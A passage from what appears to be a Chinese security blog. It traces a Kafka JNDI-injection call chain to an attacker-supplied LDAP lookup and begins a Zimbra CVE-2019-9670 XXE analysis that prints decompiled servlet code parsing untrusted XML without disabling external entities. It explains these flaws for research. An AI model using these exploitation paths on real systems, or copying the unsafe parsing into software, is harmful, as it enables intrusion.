alt="image-20230403201712476"></a></p><p>又调用了javax.security.auth.login.LoginContext#login：</p><p><a href="https://pic.imgdb.cn/item/642bf1496ea21b9a9e65a283.jpg" title="image-20230403201751765" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1496ea21b9a9e65a283.jpg" alt="image-20230403201751765"></a></p><p>调用了javax.security.auth.login.LoginContext#invokePriv，并传入了LOGIN_METHOD，它的值是”login”：</p><p><a href="https://pic.imgdb.cn/item/642bf1586ea21b9a9e65ee78.jpg" title="image-20230403201905949" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1586ea21b9a9e65ee78.jpg" alt="image-20230403201905949"></a></p><p>javax.security.auth.login.LoginContext#invokePriv部分代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(String methodName)</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// start at moduleIndex</span></span><br><span class="line">        <span class="comment">// - this can only be non-zero if methodName is LOGIN_METHOD</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> moduleIndex; i &lt; moduleStack.length; i++, moduleIndex++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">mIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                Method[] methods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (moduleStack[i].<span class="keyword">module</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">                    methods = moduleStack[i].<span class="keyword">module</span>.getClass().getMethods();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// instantiate the LoginModule</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">// Allow any object to be a LoginModule as long as it</span></span><br><span class="line">                    <span class="comment">// conforms to the interface.</span></span><br><span class="line">                    Class&lt;?&gt; c = Class.forName(</span><br><span class="line">                                moduleStack[i].entry.getLoginModuleName(),</span><br><span class="line">                                <span class="literal">true</span>,</span><br><span class="line">                                contextClassLoader);</span><br><span class="line"></span><br><span class="line">                    Constructor&lt;?&gt; constructor = c.getConstructor(PARAMS);</span><br><span class="line">                    Object[] args = &#123; &#125;;</span><br><span class="line">                    moduleStack[i].<span class="keyword">module</span> = constructor.newInstance(args);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// call the LoginModule&#x27;s initialize method</span></span><br><span class="line">                    methods = moduleStack[i].<span class="keyword">module</span>.getClass().getMethods();</span><br><span class="line">                    <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (methods[mIndex].getName().equals(INIT_METHOD)) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Object[] initArgs = &#123;subject,</span><br><span class="line">                                        callbackHandler,</span><br><span class="line">                                        state,</span><br><span class="line">                                        moduleStack[i].entry.getOptions() &#125;;</span><br><span class="line">                    <span class="comment">// invoke the LoginModule initialize method</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                    <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                    <span class="comment">// the future.</span></span><br><span class="line">                    methods[mIndex].invoke(moduleStack[i].<span class="keyword">module</span>, initArgs);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// find the requested method in the LoginModule</span></span><br><span class="line">                <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methods[mIndex].getName().equals(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// set up the arguments to be passed to the LoginModule method</span></span><br><span class="line">                Object[] args = &#123; &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// invoke the LoginModule method</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                <span class="comment">// the future.</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">status</span> <span class="operator">=</span> ((Boolean)methods[mIndex].invoke</span><br><span class="line">                                (moduleStack[i].<span class="keyword">module</span>, args)).booleanValue();</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="comment">//......</span></span><br></pre></td></tr></table></figure><p>moduleStack如下：</p><p><a href="https://pic.imgdb.cn/item/642bf1686ea21b9a9e6643f7.jpg" title="image-20230403202139848" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1686ea21b9a9e6643f7.jpg" alt="image-20230403202139848"></a></p><p>在invoke函数中，遍历了moduleStack，进入else：</p><p><a href="https://pic.imgdb.cn/item/642bf1776ea21b9a9e669703.jpg" title="image-20230403202249039" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1776ea21b9a9e669703.jpg" alt="image-20230403202249039"></a></p><p>这里INIT_METHOD的值是”initialize”，这里是反射获取moduleStack[i].entry.getLoginModuleName()也就是com.sun.security.auth.module.JndiLoginModule中的所有方法并遍历，如果找到initialize方法，就利用反射的方法进行调用。</p><p>执行完else中的代码之后，接着执行如下的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// find the requested method in the LoginModule</span></span><br><span class="line">                <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methods[mIndex].getName().equals(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// set up the arguments to be passed to the LoginModule method</span></span><br><span class="line">                Object[] args = &#123; &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// invoke the LoginModule method</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                <span class="comment">// the future.</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">status</span> <span class="operator">=</span> ((Boolean)methods[mIndex].invoke</span><br><span class="line">                                (moduleStack[i].<span class="keyword">module</span>, args)).booleanValue();</span><br></pre></td></tr></table></figure><p>如果上面调用initialize方法的部分看明白了，就能一眼看出这里是调用com.sun.security.auth.module.JndiLoginModule的login方法。跟进后：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">login</span><span class="params">()</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// attempt the authentication by prompting for the username and pwd</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            attemptAuthentication(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// authentication succeeded</span></span><br><span class="line">           succeeded = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                                <span class="string">&quot;regular authentication succeeded&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LoginException le) &#123;</span><br><span class="line">            cleanState();</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                                <span class="string">&quot;regular authentication failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> le;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用了com.sun.security.auth.module.JndiLoginModule#attemptAuthentication：</p><p><a href="https://pic.imgdb.cn/item/642bf18c6ea21b9a9e66f3bb.jpg" title="image-20230403203005527" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf18c6ea21b9a9e66f3bb.jpg" alt="image-20230403203005527"></a></p><p>其中userProvider是在initialize方法中得到的：</p><p><a href="https://pic.imgdb.cn/item/642bf19c6ea21b9a9e6730cd.jpg" title="image-20230403203238068" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf19c6ea21b9a9e6730cd.jpg" alt="image-20230403203238068"></a></p><p>也就是我们POC中的恶意ldap服务：</p><p><a href="https://pic.imgdb.cn/item/642bf1aa6ea21b9a9e6764ff.jpg" title="image-20230403203259274" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1aa6ea21b9a9e6764ff.jpg" alt="image-20230403203259274"></a></p><p>之后执行lookup完成JNDI注入。</p><p>最后贴一下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">new KafkaProducer&lt;&gt;(props)</span><br><span class="line">-&gt; KafkaProducer#KafkaProducer(...)</span><br><span class="line">-&gt; KafkaProducer#newSender(logContext, kafkaClient, this.metadata)</span><br><span class="line">-&gt; ClientUtils#createChannelBuilder(this.producerConfig, this.time, logContext)</span><br><span class="line">-&gt; ChannelBuilders#clientChannelBuilder(...;</span><br><span class="line">-&gt; ChannelBuilders#create(...;</span><br><span class="line">-&gt; ((ChannelBuilder)channelBuilder)#configure(configs);</span><br><span class="line">-&gt; LoginManager#acquireLoginManager(...)</span><br><span class="line">-&gt; new LoginManager(jaasContext, saslMechanism, configs, loginMetadata)</span><br><span class="line">-&gt; LoginContext#login()</span><br><span class="line">-&gt; LoginContext#invokePriv(LOGIN_METHOD)</span><br><span class="line">-&gt; LoginContext#invoke(methodName)</span><br><span class="line">-&gt; JndiLoginModule#login()</span><br><span class="line">-&gt; JndiLoginModule#attemptAuthentication(true)</span><br><span class="line">-&gt; InitialContext#lookup(userProvider)</span><br></pre></td></tr></table></figure><p>这个漏洞的利用条件还是比较高的，基于远程LDAP引用注入需要java版本小于11.0.1、8u191、7u201、6u211，因此公网上能够找到的目标并不多。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zimbra Exploit</title>
      <link href="/2023/03/17/zimbraExploit/"/>
      <url>/2023/03/17/zimbraExploit/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2019-9670-zimbra-XXE"><a href="#CVE-2019-9670-zimbra-XXE" class="headerlink" title="CVE-2019-9670 zimbra XXE"></a>CVE-2019-9670 zimbra XXE</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>网上关于这个漏洞的审计似乎比较少，所以在分析漏洞原理的时候走了一些不必要的弯路。根据漏洞披露出的细节来看，在&#x2F;Autodiscover中存在CVE-2019-9670，查找zimbra-core中带有Autodicover的类名：</p><p>find . -name “*.jar”|awk ‘{print “jar -tvf “$1}’ | sh -x | grep -i Autodiscover</p><p>找到如下两个jar包：</p><p><a href="https://pic.imgdb.cn/item/642bebcf6ea21b9a9e3ef172.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bebcf6ea21b9a9e3ef172.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/642bebec6ea21b9a9e3fc958.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bebec6ea21b9a9e3fc958.jpg"></a></p><p>可以看出nashorn.jar是jre的中的jar包，应该不是我们的目标，而AutoDiscoverServlet带有Servlet字样，应是对外提供服务的。（这里纠结了很久，其实大致浏览一下代码，就可以确定哪个才是目标）</p><p>拿出zimbrastore.jar放入IDEA或者jd-gui进行反编译，其中doPost部分如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    ZimbraLog.clearContext();</span><br><span class="line">    addRemoteIpToLoggingContext(req);</span><br><span class="line">    log.info(<span class="string">&quot;Handling autodiscover request...&quot;</span>);</span><br><span class="line">    <span class="type">byte</span>[] reqBytes = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">byte</span>[] reqBytes = ByteUtil.getContent(req.getInputStream(), req.getContentLength());</span><br><span class="line">    <span class="keyword">if</span> (reqBytes == <span class="literal">null</span>) &#123;</span><br><span class="line">        log.warn(<span class="string">&quot;No content found in the request&quot;</span>);</span><br><span class="line">        sendError(resp, <span class="number">600</span>, <span class="string">&quot;No content found in the request&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(reqBytes, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        log.debug(<span class="string">&quot;Request before auth: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;content&#125;);</span><br><span class="line">        String responseSchema;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            Enumeration&lt;String&gt; enm = req.getHeaderNames();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(enm.hasMoreElements()) &#123;</span><br><span class="line">                responseSchema = (String)enm.nextElement();</span><br><span class="line">                log.info(<span class="string">&quot;POST header: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;responseSchema + <span class="string">&quot;:&quot;</span> + req.getHeader(responseSchema)&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        responseSchema = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        DocumentBuilder respDoc;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">docBuilderFactory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            respDoc = docBuilderFactory.newDocumentBuilder();</span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> respDoc.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(content)));</span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nList</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;Request&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nList.getLength(); ++i) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nList.item(i);</span><br><span class="line">                <span class="keyword">if</span> (node.getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="type">Element</span> <span class="variable">element</span> <span class="operator">=</span> (Element)node;</span><br><span class="line">                    email = getTagValue(<span class="string">&quot;EMailAddress&quot;</span>, element);</span><br><span class="line">                    responseSchema = getTagValue(<span class="string">&quot;AcceptableResponseSchema&quot;</span>, element);</span><br><span class="line">                    <span class="keyword">if</span> (email != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;cannot parse body: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;content&#125;);</span><br><span class="line">            sendError(resp, <span class="number">400</span>, <span class="string">&quot;Body cannot be parsed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (email != <span class="literal">null</span> &amp;&amp; email.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (responseSchema != <span class="literal">null</span> &amp;&amp; responseSchema.length() &gt; <span class="number">0</span> &amp;&amp; !responseSchema.equals(<span class="string">&quot;http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006&quot;</span>) &amp;&amp; !responseSchema.equals(<span class="string">&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;</span>)) &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Requested response schema not available &quot;</span> + responseSchema);</span><br><span class="line">                sendError(resp, <span class="number">503</span>, <span class="string">&quot;Requested response schema not available &quot;</span> + responseSchema);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Authenticating user&quot;</span>);</span><br><span class="line">                <span class="type">Account</span> <span class="variable">acct</span> <span class="operator">=</span> <span class="built_in">this</span>.authenticate(req, resp, responseSchema);</span><br><span class="line">                <span class="keyword">if</span> (acct != <span class="literal">null</span>) &#123;</span><br><span class="line">                    log.debug(<span class="string">&quot;Authentication finished successfully&quot;</span>);</span><br><span class="line">                    log.debug(<span class="string">&quot;content length: %d, content type: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req.getContentLength(), req.getContentType()&#125;);</span><br><span class="line">                    <span class="keyword">if</span> (req.getContentLength() != <span class="number">0</span> &amp;&amp; req.getContentType() != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (!AccountUtil.addressMatchesAccount(acct, email)) &#123;</span><br><span class="line">                                log.warn(email + <span class="string">&quot; doesn&#x27;t match account addresses for user &quot;</span> + acct.getName());</span><br><span class="line">                                sendError(resp, <span class="number">500</span>, email + <span class="string">&quot; doesn&#x27;t match account addresses&quot;</span>);</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ServiceException var16) &#123;</span><br><span class="line">                            log.warn(<span class="string">&quot;Account access error; user=&quot;</span> + acct.getName(), var16);</span><br><span class="line">                            sendError(resp, <span class="number">500</span>, <span class="string">&quot;Account access error; user=&quot;</span> + acct.getName());</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        respDoc = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        String respDoc;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">serviceUrl</span> <span class="operator">=</span> getServiceUrl(acct, responseSchema);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">displayName</span> <span class="operator">=</span> acct.getDisplayName() == <span class="literal">null</span> ? email : acct.getDisplayName();</span><br><span class="line">                            <span class="keyword">if</span> (displayName.contains(<span class="string">&quot;@&quot;</span>)) &#123;</span><br><span class="line">                                displayName = displayName.substring(<span class="number">0</span>, displayName.indexOf(<span class="string">&quot;@&quot;</span>));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            log.debug(<span class="string">&quot;displayName: %s, email: %s, serviceUrl: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;displayName, email, serviceUrl&#125;);</span><br><span class="line">                            <span class="keyword">if</span> (isEwsClient(responseSchema)) &#123;</span><br><span class="line">                                respDoc = createResponseDocForEws(displayName, email, serviceUrl, acct);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                respDoc = createResponseDoc(displayName, email, serviceUrl);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">                            log.warn(var15);</span><br><span class="line">                            sendError(resp, <span class="number">500</span>, var15.getMessage());</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        log.info(<span class="string">&quot;Response: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;respDoc&#125;);</span><br><span class="line">                        log.debug(<span class="string">&quot;response length: %d&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;respDoc.length()&#125;);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ByteUtil.copy(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(respDoc.getBytes(<span class="string">&quot;UTF-8&quot;</span>)), <span class="literal">true</span>, resp.getOutputStream(), <span class="literal">false</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">                            log.error(<span class="string">&quot;copy response error&quot;</span>, var14);</span><br><span class="line">                            sendError(resp, <span class="number">500</span>, var14.getMessage());</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        log.debug(<span class="string">&quot;setting content type to text/xml&quot;</span>);</span><br><span class="line">                        resp.setContentType(<span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">                        log.info(<span class="string">&quot;sending autodiscover response...&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        log.warn(<span class="string">&quot;No suitable content found in the request&quot;</span>);</span><br><span class="line">                        sendError(resp, <span class="number">600</span>, <span class="string">&quot;No suitable content found in the request&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;No Email address is specified in the Request, %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;content&#125;);</span><br><span class="line">            sendError(resp, <span class="number">400</span>, <span class="string">&quot;No Email address is specified in the Request&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意如下部分：</p><p><a href="https://pic.imgdb.cn/item/642bec0e6ea21b9a9e40be67.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec0e6ea21b9a9e40be67.jpg"></a></p><p>这里获取了我们传入的Request标签中的元素，将EMailAddress标签的值和AcceptableResponseSchema标签的值分别赋值给email和responseSchema，若email为空或responseSchema为空，则直接返回400状态码及Body cannot be parsed。</p><p>我们可以传入如下body，查看响应：</p><p><a href="https://pic.imgdb.cn/item/642bec2e6ea21b9a9e41b748.jpg" title="image-20230403125629868" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec2e6ea21b9a9e41b748.jpg" alt="image-20230403125629868"></a></p><p>此时就可以确认这个类是Autodiscover功能对应类。进入之后的if判断，代码如下：</p><p><a href="https://pic.imgdb.cn/item/642bec3c6ea21b9a9e421f9b.jpg" title="image-20230403125818642" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec3c6ea21b9a9e421f9b.jpg" 